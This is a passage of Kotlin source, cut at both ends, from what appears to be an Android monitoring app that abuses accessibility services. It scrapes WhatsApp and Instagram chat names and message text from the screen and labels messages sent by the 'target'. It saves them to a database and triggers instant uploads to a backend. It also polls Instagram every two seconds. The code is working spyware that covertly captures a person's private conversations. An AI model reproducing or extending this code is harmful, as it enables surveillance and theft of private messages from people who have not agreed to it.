        if (t.matches("""^\d{1,2}[:.]\d{2}\s*(?:AM|PM|am|pm)\b.*""".toRegex(RegexOption.IGNORE_CASE)) && t.length <= 25) return true
        return false
    }

    private fun getWhatsAppCurrentChatTitle(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null

        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        val maxHeaderY = screenHeight * 0.20f

        try {
            val candidateIds = listOf(
                "com.whatsapp:id/conversation_contact_name",
                "com.whatsapp.w4b:id/conversation_contact_name",
                "com.whatsapp:id/conversation_title",
                "com.whatsapp:id/contact_name",
                "com.whatsapp:id/chat_name",
                "com.whatsapp:id/chat_title",
                "com.whatsapp:id/user_name",
                "com.whatsapp:id/conversation_header",
                "com.whatsapp:id/header_title",
                "com.whatsapp:id/toolbar_title",
                "com.whatsapp:id/action_bar_title",
                "com.whatsapp:id/name",
                "com.whatsapp:id/title"
            )
            for (id in candidateIds) {
                try {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) {
                        for (node in nodes) {
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            // Must be in the top action bar
                            if (rect.top >= maxHeaderY || rect.bottom <= 20) continue

                            val t = (node.text?.toString() ?: "").trim()
                            if (t.isNotBlank() && !isWhatsAppReservedTitle(t) && !isWhatsAppUiMetadataOrTimestamp(t) &&
                                !t.startsWith("last seen", ignoreCase = true) &&
                                !t.startsWith("online", ignoreCase = true) &&
                                !t.startsWith("typing", ignoreCase = true) &&
                                !t.contains("end-to-end", ignoreCase = true) &&
                                !t.contains("tap for contact info", ignoreCase = true) &&
                                !t.contains("tap for group info", ignoreCase = true) &&
                                !t.contains("tap here", ignoreCase = true)
                            ) {
                                val clean = t.replace("\\s+".toRegex(), " ").trim()
                                if (clean.length in 1..60) {
                                    lastClickedWhatsAppChat = clean
                                    lastClickedWhatsAppChatTime = System.currentTimeMillis()
                                    return clean
                                }
                            }

                            val cd = node.contentDescription?.toString()
                            val cdName = extractWhatsAppNameFromDesc(cd) ?: (if (!cd.isNullOrBlank() && !isWhatsAppReservedTitle(cd) && !isWhatsAppUiMetadataOrTimestamp(cd) && !cd.contains(":\\d{2}".toRegex()) && !cd.contains("tap here", ignoreCase = true)) cd.trim() else null)
                            if (!cdName.isNullOrBlank() && cdName.length in 1..60) {
                                lastClickedWhatsAppChat = cdName
                                lastClickedWhatsAppChatTime = System.currentTimeMillis()
                                return cdName
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            val headerTitles = mutableListOf<String>()
            val extractedProfileTitles = mutableListOf<String>()
            val cdTitles = mutableListOf<String>()

            fun findHeader(node: AccessibilityNodeInfo?, depth: Int = 0) {
                if (node == null || depth > 35) return
                try {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.top < maxHeaderY && rect.bottom > 20 && rect.height() in 15..250) {
                        val t = (node.text?.toString() ?: "").trim()
                        if (t.isNotBlank() && !isWhatsAppReservedTitle(t) &&
                            !t.startsWith("last seen", ignoreCase = true) &&
                            !t.startsWith("online", ignoreCase = true) &&
                            !t.startsWith("typing", ignoreCase = true) &&
                            !t.contains("end-to-end", ignoreCase = true) &&
                            !t.contains("tap for contact info", ignoreCase = true) &&
                            !t.contains("tap for group info", ignoreCase = true) &&
                            !t.contains("tap here", ignoreCase = true) &&
                            !isWhatsAppUiMetadataOrTimestamp(t) &&
                            t.length in 2..60
                        ) {
                            headerTitles.add(t)
                        }

                        val cd = node.contentDescription?.toString()
                        val cdName = extractWhatsAppNameFromDesc(cd)
                        if (!cdName.isNullOrBlank() && cdName.length in 1..60) {
                            extractedProfileTitles.add(cdName)
                        } else if (!cd.isNullOrBlank()) {
                            val cdTrim = cd.trim()
                            if (!isWhatsAppReservedTitle(cdTrim) && !isWhatsAppUiMetadataOrTimestamp(cdTrim) &&
                                !cdTrim.contains(":\\d{2}".toRegex()) && !cdTrim.contains("tap here", ignoreCase = true) &&
                                cdTrim.length in 2..60) {
                                cdTitles.add(cdTrim)
                            }
                        }
                    }
                    for (i in 0 until node.childCount) {
                        try {
                            findHeader(node.getChild(i), depth + 1)
                        } catch (_: Throwable) {}
                    }
                } catch (_: Throwable) {}
            }
            findHeader(root)
            val candidate = extractedProfileTitles.firstOrNull() ?: headerTitles.firstOrNull() ?: cdTitles.firstOrNull()
            if (!candidate.isNullOrBlank()) {
                val clean = candidate.replace("\\s+".toRegex(), " ").trim()
                lastClickedWhatsAppChat = clean
                lastClickedWhatsAppChatTime = System.currentTimeMillis()
                return clean
            }
        } catch (_: Throwable) {}

        return null
    }

    fun hasDirectChatComposer(node: AccessibilityNodeInfo?, depth: Int = 0): Boolean {
        if (node == null || depth > 30) return false
        val id = (node.viewIdResourceName ?: "").lowercase()
        val text = (node.text?.toString() ?: "").trim()
        val hint = (node.hintText?.toString() ?: "").trim()
        val desc = (node.contentDescription?.toString() ?: "").trim()

        if (id.contains("composer_edittext") || id.contains("row_thread_composer")) return true
        if (id.contains("composer_button_send")) return true
        if (hint.contains("Message", ignoreCase = true) || text.contains("Message", ignoreCase = true)) return true
        if (hint.contains("Send message", ignoreCase = true) || text.contains("Send message", ignoreCase = true)) return true
        if (desc.contains("Send", ignoreCase = true) && desc.contains("message", ignoreCase = true)) return true
        if (node.isEditable && (node.className?.toString()?.contains("EditText", ignoreCase = true) == true)) {
            if (!id.contains("search") && !desc.contains("search", ignoreCase = true) && !hint.contains("comment", ignoreCase = true)) {
                return true
            }
        }
        for (i in 0 until node.childCount) {
            try {
                if (hasDirectChatComposer(node.getChild(i), depth + 1)) return true
            } catch (_: Exception) {}
        }
        return false
    }

    fun extractInstagramNameFromDesc(desc: String?): String? {
        if (desc.isNullOrBlank()) return null
        val d = desc.trim()
        val prefixes = listOf("Profile photo of ", "Profile picture of ", "View photo of ", "Photo of ")
        for (p in prefixes) {
            if (d.startsWith(p, ignoreCase = true)) {
                val name = d.substring(p.length).trim()
                if (name.length in 1..60 && !isInstagramReservedTitle(name)) {
                    return name
                }
            }
        }
        val suffixes = listOf(
            "'s profile photo", "'s profile picture", "’s profile photo", "’s profile picture",
            ", tap to view profile", ", tap for info", ", active now", ", active today"
        )
        for (s in suffixes) {
            if (d.contains(s, ignoreCase = true)) {
                val name = d.substring(0, d.indexOf(s, ignoreCase = true)).trim()
                if (name.length in 1..60 && !isInstagramReservedTitle(name)) {
                    return name
                }
            }
        }
        return null
    }

    private fun getInstagramCurrentChatTitle(root: AccessibilityNodeInfo?): String? {
        val actualRoot = getInstagramWindowRoot(root) ?: root
        if (actualRoot == null) return null

        val screenHeight = try { resources.displayMetrics.heightPixels } catch (_: Exception) { 2000 }
        val maxHeaderY = screenHeight * 0.20f

        try {
            val candidateIds = listOf(
                "com.instagram.android:id/action_bar_title",
                "com.instagram.android:id/action_bar_large_title_auto_size",
                "com.instagram.android:id/action_bar_textview_title",
                "com.instagram.android:id/row_thread_header_name",
                "com.instagram.android:id/thread_title",
                "com.instagram.android:id/header_title",
                "com.instagram.android:id/user_name",
                "com.instagram.android:id/title"
            )
            for (id in candidateIds) {
                try {
                    val nodes = actualRoot.findAccessibilityNodeInfosByViewId(id)
                    if (!nodes.isNullOrEmpty()) {
                        for (node in nodes) {
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            if (rect.top >= maxHeaderY || rect.bottom <= 20) continue

                            val text = (node.text ?: node.contentDescription)?.toString()?.trim()
                            if (!text.isNullOrBlank() && !isInstagramReservedTitle(text)) {
                                val clean = text.replace("\\s+".toRegex(), " ").trim()
                                if (clean.length in 1..60) {
                                    lastClickedInstagramChat = clean
                                    lastClickedInstagramChatTime = System.currentTimeMillis()
                                    return clean
                                }
                            }

                            val cd = node.contentDescription?.toString()
                            val cdName = extractInstagramNameFromDesc(cd)
                            if (!cdName.isNullOrBlank()) {
                                lastClickedInstagramChat = cdName
                                lastClickedInstagramChatTime = System.currentTimeMillis()
                                return cdName
                            }
                        }
                    }
                } catch (_: Exception) {}
            }

            val headerNodes = mutableListOf<String>()
            val extractedProfileNames = mutableListOf<String>()
            val cdNodes = mutableListOf<String>()
            fun findHeader(node: AccessibilityNodeInfo?, depth: Int = 0) {
                if (node == null || depth > 35) return
                try {
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.top < maxHeaderY && rect.bottom > 20 && rect.height() in 15..250) {
                        val t = node.text?.toString()?.trim()
                        val cd = node.contentDescription?.toString()?.trim()
                        if (!t.isNullOrBlank() && !isInstagramReservedTitle(t) && t.length in 2..60) {
                            headerNodes.add(t)
                        }
                        val cdName = extractInstagramNameFromDesc(cd)
                        if (!cdName.isNullOrBlank()) {
                            extractedProfileNames.add(cdName)
                        } else if (!cd.isNullOrBlank() && !isInstagramReservedTitle(cd) && cd.length in 2..60) {
                            cdNodes.add(cd)
                        }
                    }
                    for (i in 0 until node.childCount) {
                        try {
                            findHeader(node.getChild(i), depth + 1)
                        } catch (_: Throwable) {}
                    }
                } catch (_: Throwable) {}
            }
            findHeader(actualRoot)
            val candidate = extractedProfileNames.firstOrNull() ?: headerNodes.firstOrNull() ?: cdNodes.firstOrNull()
            if (!candidate.isNullOrBlank()) {
                val clean = candidate.replace("\\s+".toRegex(), " ").trim()
                lastClickedInstagramChat = clean
                lastClickedInstagramChatTime = System.currentTimeMillis()
                return clean
            }
        } catch (_: Throwable) {}

        return null
    }

    private fun recordWhatsAppChatListIfVisible(root: AccessibilityNodeInfo?) {
        // WhatsApp home chat list capture disabled to optimize database storage.
        // Chats and messages are only captured when conversations are active/sent/received.
    }

    private fun recordInstagramChatOpened(chatTitle: String) {
        if (chatTitle.isBlank() || isInstagramReservedTitle(chatTitle)) return
        val now = System.currentTimeMillis()
        val key = "ig_open|$chatTitle"
        if (shouldCaptureMessage(key, 3_000L)) {
            scope.launch {
                try {
                    val db = AppDatabase.getInstance(applicationContext)
                    val existing = db.instagramMessageDao().findExistingRecent(
                        chatTitle, "Opened chat", false, now - 60_000L
                    )
                    if (existing == null) {
                        db.instagramMessageDao().insertAll(
                            listOf(
                                InstagramMessageEntry(
                                    chatName = chatTitle,
                                    sender = chatTitle,
                                    messageText = "Opened chat",
                                    isOutgoing = false,
                                    messageTimeEpochMs = now,
                                    mediaType = "text"
                                )
                            )
                        )
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext, immediate = true)
                    }
                } catch (_: Exception) {}
            }
        }
    }

    private fun recordInstagramDirectListIfVisible(root: AccessibilityNodeInfo?) {
        // Instagram direct list auto-scrape disabled to prevent non-chat UI noise.
        // Chats and messages are captured with 100% precision when conversations are opened, active, or sent/received.
    }

    fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
        val actualRoot = getWhatsAppWindowRoot(root) ?: return
        val pkg = actualRoot.packageName?.toString() ?: ""
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        // 1. Strict verification: ONLY record if inside an actual conversation!
        if (!isInsideWhatsAppConversation(actualRoot)) {
            return
        }

        try {
            // Find WhatsApp contact/group name in top action bar
            val chatTitle = getWhatsAppCurrentChatTitle(actualRoot)
            if (chatTitle.isNullOrBlank() || chatTitle.equals("WhatsApp Chat", ignoreCase = true) || isWhatsAppReservedTitle(chatTitle)) {
                return
            }

            lastClickedWhatsAppChat = chatTitle
            lastClickedWhatsAppChatTime = System.currentTimeMillis()

            if (!chatTitle.equals(lastActiveChatForSignatures, ignoreCase = true)) {
                lastActiveChatForSignatures = chatTitle
                currentChatSeenSignatures.clear()
                recordWhatsAppChatOpened(chatTitle)
            }

            val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels
            val screenHeight = displayMetrics.heightPixels

            fun extractReelUrl(txt: String?): String? = WhatsAppNotificationListener.extractReelUrl(txt)

            fun findReelUrlInNode(node: AccessibilityNodeInfo?, depth: Int = 0): String? {
                if (node == null || depth > 4) return null
                val t = node.text?.toString()
                val cd = node.contentDescription?.toString()
                extractReelUrl(t)?.let { return it }
                extractReelUrl(cd)?.let { return it }
                for (i in 0 until node.childCount) {
                    val found = findReelUrlInNode(node.getChild(i), depth + 1)
                    if (found != null) return found
                }
                return null
            }

            fun findReelUrlNearby(node: AccessibilityNodeInfo?): String? {
                if (node == null) return null
                findReelUrlInNode(node)?.let { return it }
                node.parent?.let { parent ->
                    findReelUrlInNode(parent)?.let { return it }
                    parent.parent?.let { grandParent ->
                        findReelUrlInNode(grandParent)?.let { return it }
                    }
                }
                return null
            }

            val composerNode = findWhatsAppComposerNode(actualRoot)
            val composerRect = Rect()
            composerNode?.getBoundsInScreen(composerRect)
            val maxMessageBottom = if (composerRect.top > 100) composerRect.top - 5 else (screenHeight * 0.88f).toInt()
            val minMessageTop = (screenHeight * 0.10f).toInt()

            val candidateNodes = mutableListOf<AccessibilityNodeInfo>()
            fun collectMessageNodes(node: AccessibilityNodeInfo?, depth: Int = 0) {
                if (node == null || depth > 40) return
                try {
                    if (node.isEditable || node.className?.toString()?.contains("EditText", ignoreCase = true) == true) return
                    val t = node.text?.toString()?.trim()
                    val cd = node.contentDescription?.toString()?.trim()
                    val rect = Rect()
                    node.getBoundsInScreen(rect)

                    // Message bubbles strictly between header and bottom message composer
                    if (rect.top >= minMessageTop && rect.bottom <= maxMessageBottom) {
                        val isTextTs = !t.isNullOrBlank() && isWhatsAppUiMetadataOrTimestamp(t)
                        val isCdTs = !cd.isNullOrBlank() && isWhatsAppUiMetadataOrTimestamp(cd)

                        if (!isTextTs && !isCdTs) {
                            val candidateText = when {
                                !t.isNullOrBlank() -> t
                                !cd.isNullOrBlank() -> cd
                                else -> null
                            }
                            if (!candidateText.isNullOrBlank() &&
                                !candidateText.equals(chatTitle, ignoreCase = true) &&
                                !isWhatsAppReservedTitle(candidateText) &&
                                !candidateText.equals("Type a message", ignoreCase = true) &&
                                !candidateText.equals("Message", ignoreCase = true) &&
                                !candidateText.equals("Search", ignoreCase = true) &&
                                !candidateText.equals("WhatsApp", ignoreCase = true) &&
                                !candidateText.contains("end-to-end encrypted", ignoreCase = true)
                            ) {
                                candidateNodes.add(node)
                            }
                        }
                    }
                    for (i in 0 until node.childCount) {
                        try {
                            collectMessageNodes(node.getChild(i), depth + 1)
                        } catch (_: Throwable) {}
                    }
                } catch (_: Throwable) {}
            }
            collectMessageNodes(actualRoot)

            for (node in candidateNodes) {
                val t = node.text?.toString()?.trim()
                val cd = node.contentDescription?.toString()?.trim()
                val rawText = when {
                    !t.isNullOrBlank() -> t
                    !cd.isNullOrBlank() -> cd
                    else -> continue
                }
                if (rawText.isBlank() || isWhatsAppUiMetadataOrTimestamp(rawText) || isWhatsAppReservedTitle(rawText)) continue

                var extractedMsg = rawText
                if (node.text.isNullOrBlank() && !cd.isNullOrBlank()) {
                    val colonIdx = cd.indexOf(": ")
                    if (colonIdx != -1) {
                        extractedMsg = cd.substring(colonIdx + 2).trim()
                    }
                }
                val waCleanRegex = Regex(""",\\s*(?:\\d{1,2}[:.]\\d{2}(?:\\s*(?:AM|PM|am|pm))?|Delivered|Read|Sent|Pending|Seen|Today|Yesterday).*$""", RegexOption.IGNORE_CASE)
                extractedMsg = extractedMsg.replace(waCleanRegex, "").trim()
                extractedMsg = extractedMsg.replace("""^\\d{1,2}[:.]\\d{2}\\s*(?:AM|PM|am|pm)?,?\\s*""".toRegex(RegexOption.IGNORE_CASE), "").trim()
                if (extractedMsg.isBlank() || isWhatsAppUiMetadataOrTimestamp(extractedMsg) || isWhatsAppReservedTitle(extractedMsg)) continue

                val rect = Rect()
                node.getBoundsInScreen(rect)
                val parentRect = Rect()
                node.parent?.getBoundsInScreen(parentRect)

                val cleanText = if (extractedMsg.startsWith("You: ", ignoreCase = true)) extractedMsg.substring(5).trim() else extractedMsg
                if (cleanText.isBlank() || isWhatsAppUiMetadataOrTimestamp(cleanText) || isWhatsAppReservedTitle(cleanText)) continue

                // Check delivery status icons / receipts on container or ancestors (Delivered, Read, Sent, Pending, Checkmarks)
                var hasStatusIcon = false
                var container = node.parent
                var containerDepth = 0
                while (container != null && containerDepth < 3) {
                    for (i in 0 until container.childCount) {
                        val ch = container.getChild(i) ?: continue
                        val chId = (ch.viewIdResourceName ?: "").lowercase()
                        val chDesc = (ch.contentDescription ?: "").toString().lowercase()
                        if (chId.contains("status") || chId.contains("receipt") || chId.contains("msg_status") ||
                            chDesc.contains("delivered") || chDesc.contains("read") || chDesc.contains("sent") ||
                            chDesc.contains("pending") || chDesc.contains("clock") || chDesc.contains("check")) {
                            hasStatusIcon = true
                            break
                        }
                    }
                    if (hasStatusIcon) break
                    container = container.parent
                    containerDepth++
                }

                val normalizedText = cleanText.lowercase().trim()
                val lastSentTime = recentSentWhatsAppTexts[normalizedText]
                val isRecentlySentByTarget = lastSentTime != null && (now - lastSentTime) < 120_000L

                val isRightAligned = (parentRect.right >= (screenWidth * 0.82f) && parentRect.left > (screenWidth * 0.16f)) ||
                                     (rect.right >= (screenWidth * 0.78f) && rect.left > (screenWidth * 0.22f))
                val isLeftAligned = (parentRect.left <= (screenWidth * 0.14f)) || (rect.left <= (screenWidth * 0.18f))

                val isOutgoing = when {
                    isRecentlySentByTarget -> true
                    hasStatusIcon -> true
                    extractedMsg.startsWith("You: ", ignoreCase = true) -> true
                    cd != null && (cd.contains("Delivered", ignoreCase = true) || cd.contains("Read", ignoreCase = true) || cd.contains("Sent", ignoreCase = true)) -> true
                    isRightAligned && !isLeftAligned -> true
                    isLeftAligned -> false
                    else -> rect.centerX() > (screenWidth * 0.62f) && rect.left > (screenWidth * 0.22f)
                }

                val reelUrl = findReelUrlNearby(node) ?: extractReelUrl(cleanText) ?: extractReelUrl(cd)
                val isReel = reelUrl != null ||
                    cleanText.contains("sent a reel", ignoreCase = true) ||
                    cleanText.contains("shared a reel", ignoreCase = true) ||
                    (cd != null && cd.contains("reel", ignoreCase = true))

                val isImage = !isReel && (
                    cleanText.equals("photo", ignoreCase = true) ||
                    cleanText.equals("image", ignoreCase = true) ||
                    cleanText.equals("📷 Photo", ignoreCase = true) ||
                    cleanText.contains("sent a photo", ignoreCase = true) ||
                    cleanText.contains("shared a photo", ignoreCase = true) ||
                    (cd != null && (cd.equals("photo", ignoreCase = true) || cd.equals("photo thumbnail", ignoreCase = true) || cd.contains("sent a photo", ignoreCase = true)))
                )

                val isVideo = !isReel && !isImage && (
                    cleanText.equals("video", ignoreCase = true) ||
                    cleanText.equals("🎥 Video", ignoreCase = true) ||
                    cleanText.contains("sent a video", ignoreCase = true) ||
                    (cd != null && (cd.equals("video", ignoreCase = true) || cd.contains("sent a video", ignoreCase = true)))
                )

                val isAudio = !isReel && !isImage && !isVideo && (
                    cleanText.equals("voice message", ignoreCase = true) ||
                    cleanText.equals("audio", ignoreCase = true) ||
                    (cd != null && cd.contains("voice message", ignoreCase = true))
                )

                val itemMediaType = when {
                    isReel -> "reel"
                    isImage -> "image"
                    isVideo -> "video"
                    isAudio -> "audio"
                    else -> "text"
                }

                val mediaPath: String? = null

                val finalText = when {
                    isReel && (cleanText.isBlank() || cleanText.equals("reel", ignoreCase = true)) -> reelUrl ?: "Instagram Reel"
                    isImage && (cleanText.isBlank() || cleanText.equals("photo", ignoreCase = true)) -> "Photo"
                    isVideo && cleanText.isBlank() -> "Video"
                    isAudio && cleanText.isBlank() -> "Voice message"
                    else -> cleanText
                }

                val key = "wa|$chatTitle|$finalText|$isOutgoing|$itemMediaType"
                if (currentChatSeenSignatures.contains(key)) {
                    continue
                }
                currentChatSeenSignatures.add(key)
                if (currentChatSeenSignatures.size > 500) {
                    currentChatSeenSignatures.clear()
                }

                entriesToInsert.add(
                    WhatsAppMessageEntry(
                        chatName = chatTitle,
                        sender = if (isOutgoing) "me" else chatTitle,
                        messageText = finalText,
                        isOutgoing = isOutgoing,
                        messageTimeEpochMs = now,
                        mediaType = itemMediaType,
                        mediaPath = mediaPath,
                        reelUrl = reelUrl
                    )
                )
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        val filteredEntries = mutableListOf<WhatsAppMessageEntry>()
                        for (entry in entriesToInsert) {
                            val existingDirection = db.whatsAppMessageDao().findRecentMessageDirection(
                                entry.chatName,
                                entry.messageText,
                                entry.messageTimeEpochMs - 2_000L
                            )
                            if (existingDirection == null) {
                                filteredEntries.add(entry)
                            } else if (existingDirection != entry.isOutgoing) {
                                db.whatsAppMessageDao().updateMessageDirection(
                                    entry.chatName,
                                    entry.messageText,
                                    entry.isOutgoing,
                                    entry.sender,
                                    entry.messageTimeEpochMs - 60_000L
                                )
                                com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext, immediate = true)
                            }
                        }
                        if (filteredEntries.isNotEmpty()) {
                            db.whatsAppMessageDao().insertAll(filteredEntries)
                            com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext, immediate = true)
                        }
                    } catch (e: Throwable) {
                        Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
                    }
                }
            } else {
                recordWhatsAppChatOpened(chatTitle)
            }
        } catch (_: Throwable) {
        }
    }

    fun getInstagramWindowRoot(fallback: AccessibilityNodeInfo? = null): AccessibilityNodeInfo? {
        var candidate = fallback
        while (candidate?.parent != null) {
            candidate = candidate.parent
        }
        val candPkg = candidate?.packageName?.toString() ?: ""
        if (candPkg.contains("instagram")) {
            return candidate
        }

        try {
            var active = rootInActiveWindow
            while (active?.parent != null) {
                active = active.parent
            }
            val activePkg = active?.packageName?.toString() ?: ""
            if (activePkg.contains("instagram")) {
                return active
            }
        } catch (_: Exception) {}

        try {
            val appWindow = windows?.firstOrNull {
                it.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION &&
                (it.root?.packageName?.contains("instagram") == true)
            }
            if (appWindow?.root != null) {
                var wRoot = appWindow.root
                while (wRoot?.parent != null) {
                    wRoot = wRoot.parent
                }
                return wRoot
            }
        } catch (_: Exception) {}

        return candidate ?: try { rootInActiveWindow } catch (_: Exception) { null }
    }

    private var instagramPollRunnable: Runnable? = null
    private fun startInstagramPolling() {
        if (instagramPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                try {
                    val root = getInstagramWindowRoot()
                    val pkg = root?.packageName?.toString() ?: ""
                    if (pkg.contains("instagram") || currentForegroundApp?.contains("instagram") == true) {
                        if (pkg.contains("instagram")) {
                            recordInstagramChatIfForeground(root)
                        }
                        pollHandler.postDelayed(this, 2000L)
                    } else {
                        instagramPollRunnable = null
                    }
                } catch (t: Throwable) {
                    Log.e(TAG, "Error in Instagram polling loop", t)
                    pollHandler.postDelayed(this, 2000L)
                }
            }
        }
        instagramPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopInstagramPolling() {
        val root = getInstagramWindowRoot()
        val pkg = root?.packageName?.toString() ?: ""
        if (pkg.contains("instagram") || currentForegroundApp?.contains("instagram") == true) {
            // Instagram is still active in foreground or behind soft keyboard, keep polling!
            return
        }
        instagramPollRunnable?.let { pollHandler.removeCallbacks(it) }
        instagramPollRunnable = null
    }

    /**
     * Checks if a tapped node in com.instagram.android belongs to the in-app Account Switcher sheet.
     * Fires immediately when the user taps an account row to switch — ZERO reliance on toast messages!
     */
    private fun checkAccountSwitcherClick(clicked: AccessibilityNodeInfo?, root: AccessibilityNodeInfo?) {
        if (clicked == null) return
        try {
            val texts = mutableListOf<String>()
            fun collect(n: AccessibilityNodeInfo?) {
                if (n == null) return
                n.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.hintText?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                for (i in 0 until n.childCount) {
                    collect(n.getChild(i))
                }
            }
            collect(clicked)
            clicked.parent?.let { parent ->
                for (i in 0 until parent.childCount) {
                    val child = parent.getChild(i)
                    child?.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                    child?.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                }
            }

            val reserved = setOf(
                "instagram", "switch accounts", "add account", "log in", "accounts", "cancel", "done",
                "close", "choose an account", "log out", "settings", "edit profile", "share profile"
            )
            for (t in texts) {
                val clean = t.removePrefix("@").trim().lowercase()
                if (clean.length in 3..32 &&
                    clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                    !clean.matches("^[0-9]+$".toRegex()) &&
                    !reserved.contains(clean)
                ) {
                    Log.i("BlockA11y", ">>> Account Switcher tapped row detected: '$clean'")
                    notifyInstagramAccountDetected(clean)
                    break
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Public handler called whenever an active Instagram account username is detected from ANY source
     * (Home feed comment box, account switcher click, bottom navigation tab, or notification subtext).
     * Compares against current account and notifies backend immediately.
     */
    fun notifyInstagramAccountDetected(detectedUsername: String) {
        // Disabled per user requirement: do not find or track login ID
    }

    fun detectAndHandleInstagramAccountSwitch(root: AccessibilityNodeInfo?) {
        if (root == null) return
        return
        val pkg = root.packageName?.toString() ?: ""
        if (!pkg.contains("instagram")) return

        try {
            val allTexts = mutableListOf<String>()
            val topCandidates = mutableListOf<Pair<String, Rect>>()
            val viewIdCandidates = mutableListOf<String>()

            fun traverseNodes(node: AccessibilityNodeInfo?) {
                if (node == null) return

                val t = node.text?.toString()?.trim()
                if (!t.isNullOrBlank()) {
                    allTexts.add(t)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(t, r))
                    }
                }

                val cd = node.contentDescription?.toString()?.trim()
                if (!cd.isNullOrBlank()) {
                    allTexts.add(cd)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
                        topCandidates.add(Pair(cd, r))
                    }
                }

                // Crucial for Instagram feed posts & reels: hintText = "Add a comment as <username>..."
                val hint = node.hintText?.toString()?.trim()
                if (!hint.isNullOrBlank()) {
                    allTexts.add(hint)
                }

                val vId = node.viewIdResourceName
                if (!vId.isNullOrBlank()) {
                    if (vId.endsWith(":id/row_user_primary_name") ||
                        vId.endsWith(":id/action_bar_title") ||
                        vId.endsWith(":id/action_bar_large_title") ||
                        vId.endsWith(":id/action_bar_textview_title") ||
                        vId.endsWith(":id/username") ||
                        vId.endsWith(":id/profile_tab")
                    ) {
                        val txt = node.text?.toString()?.trim() ?: node.contentDescription?.toString()?.trim()
                        if (!txt.isNullOrBlank()) {
                            viewIdCandidates.add(txt)
                        }
                    }
                }

                for (i in 0 until node.childCount) {
                    traverseNodes(node.getChild(i))
                }
            }
            traverseNodes(root)

            var detectedUsername: String? = null

            val reserved = setOf(
                "instagram", "direct", "messages", "search", "explore", "reels", "threads",
                "meta", "camera", "chats", "calls", "following", "followers", "edit profile",
                "share profile", "notifications", "settings", "activity", "close friends",
                "posts", "saved", "archive", "qr code", "audio", "video", "primary", "general",
                "requests", "notes", "new message", "create", "options", "more options", "back",
                "professional dashboard", "tools", "insights", "ad tools", "switch accounts",
                "add account", "log in", "log out", "accounts", "profile", "home", "search & explore",
                "uninstall", "security", "music", "danger", "tab", "double tap", "like", "reply",
                "send", "view", "comment"
            )

            // STRATEGY 1: Feed / Post / Reels Comment Box Placeholder (e.g. "Add a comment as <username>...", "Comment as <username>...")
            // On Instagram Home Feed, every post has a comment box with this exact placeholder!
            // Directly works on the Home Feed without user clicking Profile or Message icon!
            for (text in allTexts) {
                val match = "(?i)(?:add\\s+a\\s+comment\\s+as|comment\\s+as|replying\\s+as|posting\\s+as|sharing\\s+as|logged\\s+in\\s+as|signed\\s+in\\s+as|continue\\s+as)\\s+@?([a-zA-Z0-9._]+)".toRegex().find(text)
                if (match != null) {
                    val candidate = match.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                    if (candidate.length in 3..32 && !reserved.contains(candidate) && candidate.matches("^[a-zA-Z0-9._]+$".toRegex())) {
                        detectedUsername = candidate
                        break
                    }
                }
            }

            // STRATEGY 2: In-App Account Switcher Dialog / Bottom Sheet
            // When user switches accounts via long-press profile or chevron, the switcher sheet lists accounts directly.
            val isSwitcherSheet = allTexts.any {
                it.contains("Switch accounts", ignoreCase = true) ||
                it.contains("Choose an account", ignoreCase = true) ||
                it.contains("Add account", ignoreCase = true) ||
                it.contains("Log into existing account", ignoreCase = true)
            }
            if (detectedUsername == null && isSwitcherSheet) {
                for (cand in viewIdCandidates + allTexts) {
                    val clean = cand.removePrefix("@").trim().lowercase()
                    if (clean.length in 3..32 &&
                        clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                        !clean.matches("^[0-9]+$".toRegex()) &&
                        !reserved.contains(clean)
                    ) {
                        detectedUsername = clean
                        break
                    }
                }
            }

            // STRATEGY 3: Bottom Navigation Bar Profile Tab ContentDescription
            // e.g. "Profile for <user>", "<user>'s profile"
            if (detectedUsername == null) {
                for (text in allTexts) {
                    val match1 = "(?i)(?:profile\\s+(?:for|of|tab)?\\s*[:,-]?\\s*@?([a-zA-Z0-9._]+))".toRegex().find(text)
                    if (match1 != null) {
                        val candidate = match1.groupValues[1].trim().trimEnd('.').removePrefix("@").lowercase()
                        if (candidate.length in 3..32 && !reserved.contains(candidate) && !candidate.startsWith("tab") && !candidate.matches("^[0-9]+$".toRegex())) {
                            detectedUsername = candidate
                            break
                        }
                    }
                    val match2 = "(?i)@?([a-zA-Z0-9._]+)(?:'s)?\\s+profile(?:,\\s*tab)?".toRegex().find(text)
                    if (match2 != null) {
